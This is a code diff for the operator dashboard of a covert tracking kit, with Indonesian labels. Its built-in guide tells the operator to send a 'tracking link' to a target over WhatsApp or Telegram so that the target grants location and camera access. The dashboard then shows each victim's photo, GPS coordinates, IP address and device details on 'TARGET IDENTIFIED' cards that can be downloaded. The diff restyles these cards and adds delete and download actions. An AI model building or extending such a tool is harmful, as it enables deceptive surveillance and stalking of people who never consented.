@@ -85,20 +85,16 @@
       margin-bottom: 15px;
       color: #00ff9d;
       text-shadow: 0 0 8px #00ff9d;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      gap: 10px;
     }
-    .user-info {
-      font-size: 12px;
-      letter-spacing: 1px;
-      color: #7dfcce;
-    }
+    .user-info { font-size: 12px; letter-spacing: 1px; color: #7dfcce; }
     .user-info b { color: #00ff9d; text-shadow: 0 0 8px #00ff9d; }
     .label { font-size: 10px; letter-spacing: 2px; color: #7dfcce; margin-bottom: 8px; }
 
-    .input-row {
-      display: flex;
-      gap: 6px;
-      align-items: center;
-    }
+    .input-row { display: flex; gap: 6px; align-items: center; }
     input {
       flex: 1;
       padding: 10px 12px;
@@ -134,12 +130,7 @@
       box-shadow: 0 0 15px #00ff9d;
       text-shadow: none;
     }
-    #link {
-      margin-top: 15px;
-      font-size: 11px;
-      line-height: 1.6;
-      display: none;
-    }
+    #link { margin-top: 15px; font-size: 11px; line-height: 1.6; display: none; }
     .link-box {
       background: rgba(0,0,0,0.3);
       border: 1px dashed #00ff9d;
@@ -148,10 +139,7 @@
       margin-bottom: 8px;
     }
     .link-box .link-title {
-      font-size: 10px;
-      color: #7dfcce;
-      letter-spacing: 2px;
-      margin-bottom: 8px;
+      font-size: 10px; color: #7dfcce; letter-spacing: 2px; margin-bottom: 8px;
     }
     .link-box .link-url {
       color: #00d4ff;
@@ -175,103 +163,181 @@
       cursor: pointer;
       transition: all 0.3s;
     }
-    .btn-copy:hover {
-      box-shadow: 0 0 20px #00ff9d;
-      transform: scale(1.02);
+    .btn-copy:hover { box-shadow: 0 0 20px #00ff9d; transform: scale(1.02); }
+    .btn-copy.copied { background: #00d4ff; }
+
+    /* ================================================
+       KARTU IDENTITAS TARGET (WANTED STYLE)
+       ================================================ */
+    .card-target {
+      margin-top: 12px;
+      background: linear-gradient(135deg, rgba(10,20,30,0.95) 0%, rgba(0,40,25,0.95) 100%);
+      border: 2px solid #00ff9d;
+      border-radius: 8px;
+      padding: 16px;
+      box-shadow: 
+        0 0 20px rgba(0,255,157,0.5),
+        0 0 40px rgba(0,255,157,0.2),
+        inset 0 0 20px rgba(0,255,157,0.05);
+      position: relative;
+      overflow: hidden;
     }
-    .btn-copy.copied {
-      background: #00d4ff;
+    .card-target::before {
+      content: 'TARGET IDENTIFIED';
+      position: absolute;
+      top: 8px;
+      right: -30px;
+      background: #ff3366;
+      color: #fff;
+      font-size: 8px;
+      padding: 3px 35px;
+      transform: rotate(35deg);
+      font-weight: bold;
+      letter-spacing: 1.5px;
+      box-shadow: 0 0 10px #ff3366;
+      z-index: 3;
+    }
+    .card-target::after {
+      content: '';
+      position: absolute;
+      inset: 0;
+      background: 
+        repeating-linear-gradient(
+          0deg,
+          transparent 0px,
+          transparent 3px,
+          rgba(0,255,157,0.03) 3px,
+          rgba(0,255,157,0.03) 4px
+        );
+      pointer-events: none;
     }
 
-    /* Data item */
-    .item {
-      padding: 14px;
-      margin-bottom: 12px;
-      border-left: 3px solid #00ff9d;
-      background: rgba(0,255,157,0.05);
-      border-radius: 0 5px 5px 0;
-      box-shadow: 0 0 10px rgba(0,255,157,0.1);
-    }
-    .item-header {
+    .card-top {
       display: flex;
       justify-content: space-between;
       align-items: center;
-      margin-bottom: 10px;
-      gap: 10px;
-      flex-wrap: wrap;
-      border-bottom: 1px dashed rgba(0,255,157,0.3);
-      padding-bottom: 8px;
-    }
-    .item-name {
-      font-size: 13px;
-      font-weight: bold;
+      font-size: 9px;
       color: #00ff9d;
-      text-shadow: 0 0 10px #00ff9d;
       letter-spacing: 2px;
-    }
-    .item-time {
-      font-size: 10px;
-      color: #7dfcce;
-      letter-spacing: 1px;
-    }
-    .item-foto {
-      width: 100%;
-      max-width: 180px;
-      border-radius: 5px;
-      border: 2px solid #00ff9d;
-      box-shadow: 0 0 15px rgba(0,255,157,0.5);
+      padding-bottom: 8px;
+      border-bottom: 1px dashed rgba(0,255,157,0.4);
       margin-bottom: 12px;
-      display: block;
+      text-shadow: 0 0 5px #00ff9d;
+    }
+    .card-top .id-code {
+      color: #7dfcce;
     }
 
-    /* Data list - Rapih */
-    .data-list {
+    .card-photo-wrap {
+      position: relative;
+      width: 100%;
+      margin-bottom: 14px;
+    }
+    .card-photo {
+      width: 100%;
+      border-radius: 6px;
+      border: 2px solid #00ff9d;
+      box-shadow: 0 0 15px rgba(0,255,157,0.6);
+      display: block;
+      filter: contrast(1.05) saturate(1.1);
+    }
+    .card-photo-tag {
+      position: absolute;
+      top: 8px;
+      left: 8px;
+      background: rgba(10,20,30,0.85);
+      border: 1px solid #00ff9d;
+      color: #00ff9d;
+      font-size: 8px;
+      padding: 2px 6px;
+      letter-spacing: 1px;
+      border-radius: 2px;
+      text-shadow: 0 0 5px #00ff9d;
+    }
+    .card-photo-badge {
+      position: absolute;
+      bottom: 8px;
+      right: 8px;
+      background: rgba(255,51,102,0.9);
+      color: #fff;
+      font-size: 8px;
+      padding: 3px 8px;
+      letter-spacing: 1px;
+      border-radius: 2px;
+      animation: blink 1.5s infinite;
+    }
+
+    .card-name-block {
+      text-align: center;
+      padding: 8px 0;
+      margin-bottom: 12px;
+      border-top: 1px solid rgba(0,255,157,0.3);
+      border-bottom: 1px solid rgba(0,255,157,0.3);
+    }
+    .card-name-label {
+      font-size: 8px;
+      color: #7dfcce;
+      letter-spacing: 3px;
+      margin-bottom: 4px;
+    }
+    .card-name-value {
+      font-size: 18px;
+      font-weight: bold;
+      color: #00ff9d;
+      letter-spacing: 3px;
+      text-shadow: 0 0 10px #00ff9d, 0 0 20px #00ff9d;
+      text-transform: uppercase;
+    }
+
+    .card-data {
       display: flex;
       flex-direction: column;
-      gap: 4px;
-      font-size: 11px;
+      gap: 5px;
+      font-size: 10px;
+      margin-bottom: 12px;
     }
-    .data-row {
+    .card-row {
       display: flex;
       padding: 6px 8px;
-      background: rgba(0,255,157,0.04);
-      border-radius: 3px;
-      border-left: 2px solid rgba(0,255,157,0.3);
+      background: rgba(0,255,157,0.05);
+      border-left: 2px solid #00ff9d;
       align-items: center;
       gap: 8px;
+      border-radius: 0 3px 3px 0;
     }
-    .data-row .ico {
-      width: 20px;
+    .card-row .cico {
+      width: 16px;
       text-align: center;
-      font-size: 12px;
+      font-size: 11px;
       flex-shrink: 0;
     }
-    .data-row .lbl {
+    .card-row .clbl {
       color: #7dfcce;
-      font-size: 10px;
+      font-size: 9px;
       letter-spacing: 1px;
       min-width: 70px;
       flex-shrink: 0;
+      text-transform: uppercase;
     }
-    .data-row .val {
+    .card-row .cval {
       color: #00ff9d;
       flex: 1;
       word-break: break-word;
-      text-shadow: 0 0 3px rgba(0,255,157,0.5);
+      text-shadow: 0 0 4px rgba(0,255,157,0.5);
+      font-size: 11px;
     }
-    .data-row .val a {
+    .card-row .cval a {
       color: #00d4ff;
       text-decoration: none;
-      text-shadow: 0 0 5px #00d4ff;
       border-bottom: 1px dashed #00d4ff;
+      text-shadow: 0 0 5px #00d4ff;
     }
-    .data-row .val a:hover { color: #fff; }
 
-    /* Baterai bar */
+    /* Baterai bar versi cyber */
     .battery-bar {
       display: inline-block;
-      width: 60px;
-      height: 12px;
+      width: 50px;
+      height: 10px;
       border: 1px solid #00ff9d;
       border-radius: 2px;
       position: relative;
@@ -282,11 +348,10 @@
       content: '';
       position: absolute;
       right: -4px;
-      top: 3px;
+      top: 2px;
       width: 2px;
       height: 4px;
       background: #00ff9d;
-      border-radius: 0 1px 1px 0;
     }
     .battery-fill {
       height: 100%;
@@ -297,7 +362,95 @@
     .battery-fill.low { background: #ff3366; box-shadow: 0 0 5px #ff3366; }
     .battery-fill.mid { background: #ffcc00; box-shadow: 0 0 5px #ffcc00; }
 
-    .empty { color: rgba(0,255,157,0.5); font-size: 11px; letter-spacing: 1px; text-align: center; padding: 20px 0; }
+    /* Footer kartu */
+    .card-footer {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding-top: 10px;
+      border-top: 1px dashed rgba(0,255,157,0.4);
+      font-size: 8px;
+      color: #7dfcce;
+      letter-spacing: 1px;
+    }
+    .card-footer .scan-line {
+      color: #00ff9d;
+      font-size: 8px;
+      letter-spacing: 2px;
+      animation: blink 2s infinite;
+    }
+
+    /* Tombol aksi di kartu */
+    .card-actions {
+      display: flex;
+      gap: 6px;
+      margin-top: 12px;
+      padding-top: 12px;
+      border-top: 1px solid rgba(0,255,157,0.3);
+    }
+    .btn-action {
+      flex: 1;
+      padding: 9px 6px;
+      border-radius: 3px;
+      font-family: 'Courier New', monospace;
+      font-size: 10px;
+      font-weight: bold;
+      letter-spacing: 1px;
+      cursor: pointer;
+      transition: all 0.3s;
+      text-shadow: 0 0 3px currentColor;
+    }
+    .btn-download {
+      background: transparent;
+      border: 1px solid #00ff9d;
+      color: #00ff9d;
+    }
+    .btn-download:hover {
+      background: #00ff9d;
+      color: #0a0e14;
+      box-shadow: 0 0 15px #00ff9d;
+      text-shadow: none;
+    }
+    .btn-download:disabled { opacity: 0.5; cursor: wait; }
+    .btn-delete {
+      background: transparent;
+      border: 1px solid #ff3366;
+      color: #ff3366;
+    }
+    .btn-delete:hover {
+      background: #ff3366;
+      color: #0a0e14;
+      box-shadow: 0 0 15px #ff3366;
+      text-shadow: none;
+    }
+
+    .btn-clear-all {
+      padding: 6px 10px;
+      background: transparent;
+      border: 1px solid #ff3366;
+      color: #ff3366;
+      font-family: 'Courier New', monospace;
+      font-size: 9px;
+      letter-spacing: 1px;
+      cursor: pointer;
+      border-radius: 3px;
+      transition: all 0.3s;
+      text-shadow: 0 0 5px #ff3366;
+    }
+    .btn-clear-all:hover {
+      background: #ff3366;
+      color: #0a0e14;
+      box-shadow: 0 0 15px #ff3366;
+      text-shadow: none;
+    }
+
+    .empty {
+      color: rgba(0,255,157,0.5);
+      font-size: 11px;
+      letter-spacing: 1px;
+      text-align: center;
+      padding: 20px 0;
+    }
     .status {
       font-size: 10px;
       color: #00ff9d;
@@ -312,7 +465,38 @@
     }
     @keyframes blink { 50% { opacity: 0.3; } }
 
-    /* Tombol tutup panduan */
+    /* Panduan gaya cyber */
+    .panduan-list {
+      display: flex;
+      flex-direction: column;
+      gap: 5px;
+      font-size: 11px;
+    }
+    .panduan-row {
+      display: flex;
+      padding: 7px 9px;
+      background: rgba(0,255,157,0.05);
+      border-radius: 3px;
+      border-left: 2px solid rgba(0,255,157,0.5);
+      align-items: center;
+      gap: 8px;
+    }
+    .panduan-row .pico {
+      width: 18px;
+      text-align: center;
+      flex-shrink: 0;
+    }
+    .panduan-row .ptxt {
+      color: #7dfcce;
+      flex: 1;
+      letter-spacing: 0.5px;
+      font-size: 11px;
+    }
+    .panduan-row .ptxt b {
+      color: #00ff9d;
+      text-shadow: 0 0 5px #00ff9d;
+    }
+
     .btn-close-panduan {
       margin-top: 12px;
       font-size: 10px;
@@ -326,6 +510,7 @@
       cursor: pointer;
       border-radius: 3px;
       transition: all 0.3s;
+      text-shadow: 0 0 5px #00ff9d;
     }
     .btn-close-panduan:hover {
       background: rgba(0,255,157,0.15);
@@ -341,44 +526,29 @@
       <button id="logout" onclick="logout()">LOGOUT</button>
     </div>
 
-    <!-- PANEL OPERATOR -->
+    <!-- OPERATOR -->
     <div class="box">
       <div class="box-title">» OPERATOR</div>
       <div class="user-info">USER: <b id="u"></b></div>
       <div class="status">CONNECTED</div>
     </div>
 
-    <!-- PANEL PANDUAN -->
+    <!-- PANDUAN -->
     <div class="box" id="panduanBox">
       <div class="box-title">» PANDUAN OPERASI</div>
-      <div class="data-list">
-        <div class="data-row">
-          <span class="ico">1️⃣</span>
-          <span class="val" style="font-size:11px">Masukkan nama target di kolom GENERATE TRACKING LINK</span>
-        </div>
-        <div class="data-row">
-          <span class="ico">2️⃣</span>
-          <span class="val" style="font-size:11px">Klik GENERATE, lalu klik 📋 SALIN LINK</span>
-        </div>
-        <div class="data-row">
-          <span class="ico">3️⃣</span>
-          <span class="val" style="font-size:11px">Kirim link ke target via WhatsApp, Telegram, dll</span>
-        </div>
-        <div class="data-row">
-          <span class="ico">4️⃣</span>
-          <span class="val" style="font-size:11px">Target buka link → Allow lokasi & kamera</span>
-        </div>
-        <div class="data-row">
-          <span class="ico">5️⃣</span>
-          <span class="val" style="font-size:11px">Data masuk otomatis di panel INCOMING DATA</span>
-        </div>
+      <div class="panduan-list">
+        <div class="panduan-row"><span class="pico">1️⃣</span><span class="ptxt">Masukkan nama target di kolom <b>GENERATE TRACKING LINK</b></span></div>
+        <div class="panduan-row"><span class="pico">2️⃣</span><span class="ptxt">Klik <b>GENERATE</b>, lalu klik <b>📋 SALIN LINK</b></span></div>
+        <div class="panduan-row"><span class="pico">3️⃣</span><span class="ptxt">Kirim link ke target via WhatsApp, Telegram, dll</span></div>
+        <div class="panduan-row"><span class="pico">4️⃣</span><span class="ptxt">Target buka link → <b>Allow</b> lokasi & kamera</span></div>
+        <div class="panduan-row"><span class="pico">5️⃣</span><span class="ptxt">Data masuk otomatis di panel <b>INCOMING DATA</b></span></div>
       </div>
       <button class="btn-close-panduan" onclick="document.getElementById('panduanBox').style.display='none'">
         ✕ TUTUP PANDUAN
       </button>
     </div>
 
-    <!-- PANEL GENERATE LINK -->
+    <!-- GENERATE LINK -->
     <div class="box">
       <div class="box-title">» GENERATE TRACKING LINK</div>
       <div class="label">TARGET NAME:</div>
@@ -395,16 +565,19 @@
       </div>
     </div>
 
-    <!-- PANEL DATA MASUK -->
+    <!-- INCOMING DATA -->
     <div class="box">
-      <div class="box-title">» INCOMING DATA</div>
+      <div class="box-title">
+        » INCOMING DATA
+        <button class="btn-clear-all" onclick="clearAll()">🗑️ HAPUS SEMUA</button>
+      </div>
       <div id="hasil"><span class="empty">Waiting for data...</span></div>
     </div>
   </div>
 
 <script type="module">
 import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js";
-import { getDatabase, ref, onValue } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-database.js";
+import { getDatabase, ref, onValue, remove } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-database.js";
 
 const firebaseConfig = {
   apiKey: "AIzaSyBYjDmJh5OG_AkZesWObgGkSgr6yX0iBEI",
@@ -432,8 +605,7 @@ let currentLink = '';
 
 window.genLink = () => {
   const target = document.getElementById('target').value.trim() || 'target';
-  const base = location.origin;
-  const url = `${base}/track.html?u=${encodeURIComponent(user)}&t=${encodeURIComponent(target)}`;
+  const url = `${location.origin}/track.html?u=${encodeURIComponent(user)}&t=${encodeURIComponent(target)}`;
   currentLink = url;
   document.getElementById('linkUrl').innerText = url;
   document.getElementById('link').style.display = 'block';
@@ -446,8 +618,6 @@ window.copyLink = async () => {
   const btn = document.getElementById('btnCopy');
   try {
     await navigator.clipboard.writeText(currentLink);
-    btn.innerText = '✓ TERSALIN!';
-    btn.classList.add('copied');
   } catch(e) {
     const ta = document.createElement('textarea');
     ta.value = currentLink;
@@ -455,13 +625,67 @@ window.copyLink = async () => {
     ta.select();
     document.execCommand('copy');
     document.body.removeChild(ta);
-    btn.innerText = '✓ TERSALIN!';
-    btn.classList.add('copied');
   }
+  btn.innerText = '✓ TERSALIN!';
+  btn.classList.add('copied');
   setTimeout(() => {
     btn.innerText = '📋 SALIN LINK';
     btn.classList.remove('copied');
   }, 2000);
+};
+
+window.clearAll = async () => {
+  if (!confirm('Yakin hapus SEMUA data? Tidak bisa dikembalikan.')) return;
+  try {
+    await remove(ref(db, 'lokasi/' + user));
+    alert('✓ Semua data dihapus');
+  } catch(e) {
+    alert('Gagal hapus: ' + e.message);
+  }
+};
+
+window.deleteItem = async (key) => {
+  if (!confirm('Hapus data ini?')) return;
+  try {
+    await remove(ref(db, 'lokasi/' + user + '/' + key));
+  } catch(e) {
+    alert('Gagal hapus: ' + e.message);
+  }
+};
+
+window.downloadCard = async (key) => {
+  const card = document.getElementById('card-' + key);
+  if (!card) return;
+
+  const btn = card.querySelector('.btn-download');
+  const originalText = btn.innerText;
+  btn.innerText = '⏳ PROSES...';
+  btn.disabled = true;
+
+  try {
+    const canvas = await html2canvas(card, {
+      backgroundColor: '#0a0e14',
+      scale: 2,
+      useCORS: true,
+      allowTaint: true
+    });
+
+    const link = document.createElement('a');
+    const nama = card.querySelector('.card-name-value').innerText.replace(/[^a-z0-9]/gi, '_');
+    link.download = `target_${nama}_${Date.now()}.png`;
+    link.href = canvas.toDataURL('image/png');
+    link.click();
+
+    btn.innerText = '✓ TERSIMPAN!';
+    setTimeout(() => {
+      btn.innerText = originalText;
+      btn.disabled = false;
+    }, 2000);
+  } catch(e) {
+    alert('Gagal download: ' + e.message);
+    btn.innerText = originalText;
+    btn.disabled = false;
+  }
 };
 
 function batteryBar(level) {
@@ -473,42 +697,78 @@ function batteryBar(level) {
   return `<span class="battery-bar"><span class="battery-fill ${cls}" style="width:${num}%"></span></span>`;
 }
 
+function generateID(waktu) {
+  // Buat ID unik dari timestamp
+  const t = new Date(waktu);
+  const y = t.getFullYear().toString().slice(-2);
+  const m = String(t.getMonth()+1).padStart(2,'0');
+  const d = String(t.getDate()).padStart(2,'0');
+  const h = String(t.getHours()).padStart(2,'0');
+  const mn = String(t.getMinutes()).padStart(2,'0');
+  const s = String(t.getSeconds()).padStart(2,'0');
+  return `TGT-${y}${m}${d}-${h}${mn}${s}`;
+}
+
 onValue(ref(db, 'lokasi/' + user), snap => {
   const data = snap.val();
   if (!data) {
     document.getElementById('hasil').innerHTML = '<span class="empty">Waiting for data...</span>';
     return;
   }
-  const arr = Object.values(data).sort((a,b) => b.waktu - a.waktu);
-  document.getElementById('hasil').innerHTML = arr.map(d => `
-    <div class="item">
-      <div class="item-header">
-        <span class="item-name">${d.target || 'target'}</span>
-        <span class="item-time">${new Date(d.waktu).toLocaleString('id-ID')}</span>
+  const arr = Object.entries(data).sort((a,b) => b[1].waktu - a[1].waktu);
+  document.getElementById('hasil').innerHTML = arr.map(([key, d]) => `
+    <div class="card-target" id="card-${key}">
+      <div class="card-top">
+        <span>ID: <span class="id-code">${generateID(d.waktu)}</span></span>
+        <span>${new Date(d.waktu).toLocaleString('id-ID')}</span>
       </div>
-      ${d.foto ? `<img class="item-foto" src="${d.foto}" alt="foto target">` : ''}
-      <div class="data-list">
+
+      ${d.foto ? `
+        <div class="card-photo-wrap">
+          <img class="card-photo" src="${d.foto}" alt="target" crossorigin="anonymous">
+          <div class="card-photo-tag">◉ LIVE CAPTURE</div>
+          <div class="card-photo-badge">● REC</div>
+        </div>
+      ` : ''}
+
+      <div class="card-name-block">
+        <div class="card-name-label">TARGET NAME</div>
+        <div class="card-name-value">${d.target || 'UNKNOWN'}</div>
+      </div>
+
+      <div class="card-data">
         ${d.lat ? `
-          <div class="data-row"><span class="ico">📍</span><span class="lbl">LOKASI</span><span class="val">${d.kota || ''} ${d.lat.toFixed(4)}, ${d.lng.toFixed(4)}</span></div>
-          <div class="data-row"><span class="ico">🗺️</span><span class="lbl">MAPS</span><span class="val"><a href="https://www.google.com/maps?q=${d.lat},${d.lng}" target="_blank">Buka Google Maps →</a></span></div>
+          <div class="card-row"><span class="cico">📍</span><span class="clbl">Lokasi</span><span class="cval">${d.kota || ''} ${d.lat.toFixed(4)}, ${d.lng.toFixed(4)}</span></div>
         ` : ''}
-        ${d.ip ? `<div class="data-row"><span class="ico">🌐</span><span class="lbl">IP ADDRESS</span><span class="val">${d.ip}</span></div>` : ''}
-        ${d.suhu !== undefined ? `<div class="data-row"><span class="ico">🌡️</span><span class="lbl">SUHU</span><span class="val">${Math.round(d.suhu)}°C</span></div>` : ''}
-        ${d.baterai ? `<div class="data-row"><span class="ico">🔋</span><span class="lbl">BATERAI</span><span class="val">${d.baterai} ${d.charging === 'Mengisi' ? '⚡ Mengisi' : ''} ${batteryBar(d.baterai)}</span></div>` : ''}
-        ${d.platform ? `<div class="data-row"><span class="ico">💻</span><span class="lbl">PLATFORM</span><span class="val">${d.platform}</span></div>` : ''}
-        ${d.screen ? `<div class="data-row"><span class="ico">📱</span><span class="lbl">LAYAR</span><span class="val">${d.screen} ${d.pixelRatio ? '· DPR ' + d.pixelRatio : ''}</span></div>` : ''}
-        ${d.cpu ? `<div class="data-row"><span class="ico">⚙️</span><span class="lbl">CPU</span><span class="val">${d.cpu} core</span></div>` : ''}
-        ${d.memori ? `<div class="data-row"><span class="ico">🧠</span><span class="lbl">RAM</span><span class="val">${d.memori} GB</span></div>` : ''}
-        ${d.network ? `<div class="data-row"><span class="ico">📶</span><span class="lbl">JARINGAN</span><span class="val">${d.network}${d.kecepatan ? ' · ' + d.kecepatan : ''}${d.ping ? ' · ' + d.ping : ''}</span></div>` : ''}
-        ${d.bahasa ? `<div class="data-row"><span class="ico">🗣️</span><span class="lbl">BAHASA</span><span class="val">${d.bahasa}</span></div>` : ''}
-        ${d.timezone ? `<div class="data-row"><span class="ico">🕒</span><span class="lbl">ZONA WAKTU</span><span class="val">${d.timezone}</span></div>` : ''}
-        ${d.orientasi ? `<div class="data-row"><span class="ico">🔄</span><span class="lbl">ORIENTASI</span><span class="val">${d.orientasi}</span></div>` : ''}
-        ${d.touch !== undefined ? `<div class="data-row"><span class="ico">👆</span><span class="lbl">LAYAR SENTUH</span><span class="val">${d.touch ? 'Ya' : 'Tidak'}</span></div>` : ''}
-        ${d.online !== undefined ? `<div class="data-row"><span class="ico">${d.online ? '🟢' : '🔴'}</span><span class="lbl">STATUS</span><span class="val">${d.online ? 'Online' : 'Offline'}</span></div>` : ''}
+        ${d.lat ? `
+          <div class="card-row"><span class="cico">🗺️</span><span class="clbl">Maps</span><span class="cval"><a href="https://www.google.com/maps?q=${d.lat},${d.lng}" target="_blank">BUKA GOOGLE MAPS →</a></span></div>
+        ` : ''}
+        ${d.ip ? `<div class="card-row"><span class="cico">🌐</span><span class="clbl">IP</span><span class="cval">${d.ip}</span></div>` : ''}
+        ${d.suhu !== undefined ? `<div class="card-row"><span class="cico">🌡️</span><span class="clbl">Suhu</span><span class="cval">${Math.round(d.suhu)}°C</span></div>` : ''}
+        ${d.baterai ? `<div class="card-row"><span class="cico">🔋</span><span class="clbl">Baterai</span><span class="cval">${d.baterai} ${d.charging === 'Mengisi' ? '⚡' : ''} ${batteryBar(d.baterai)}</span></div>` : ''}
+        ${d.platform ? `<div class="card-row"><span class="cico">💻</span><span class="clbl">Platform</span><span class="cval">${d.platform}</span></div>` : ''}
+        ${d.screen ? `<div class="card-row"><span class="cico">📱</span><span class="clbl">Layar</span><span class="cval">${d.screen}${d.pixelRatio ? ' · DPR ' + d.pixelRatio : ''}</span></div>` : ''}
+        ${d.cpu ? `<div class="card-row"><span class="cico">⚙️</span><span class="clbl">CPU</span><span class="cval">${d.cpu} core</span></div>` : ''}
+        ${d.memori ? `<div class="card-row"><span class="cico">🧠</span><span class="clbl">RAM</span><span class="cval">${d.memori} GB</span></div>` : ''}
+        ${d.network ? `<div class="card-row"><span class="cico">📶</span><span class="clbl">Jaringan</span><span class="cval">${d.network}${d.kecepatan ? ' · ' + d.kecepatan : ''}</span></div>` : ''}
+        ${d.timezone ? `<div class="card-row"><span class="cico">🕒</span><span class="clbl">Zona Waktu</span><span class="cval">${d.timezone}</span></div>` : ''}
+        ${d.sumber ? `<div class="card-row"><span class="cico">📡</span><span class="clbl">Sumber GPS</span><span class="cval">${d.sumber}${d.akurasi ? ' ±' + d.akurasi + 'm' : ''}</span></div>` : ''}
+      </div>
+
+      <div class="card-footer">
+        <span>CYBER ANONYMOUS // RORAXBRINGAZ</span>
+        <span class="scan-line">◉ SCAN COMPLETE</span>
+      </div>
+
+      <div class="card-actions">
+        <button class="btn-action btn-download" onclick="downloadCard('${key}')">📥 DOWNLOAD KARTU</button>
+        <button class="btn-action btn-delete" onclick="deleteItem('${key}')">🗑️ HAPUS</button>
       </div>
     </div>
   `).join('');
 });
 </script>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
 </body>
 </html>
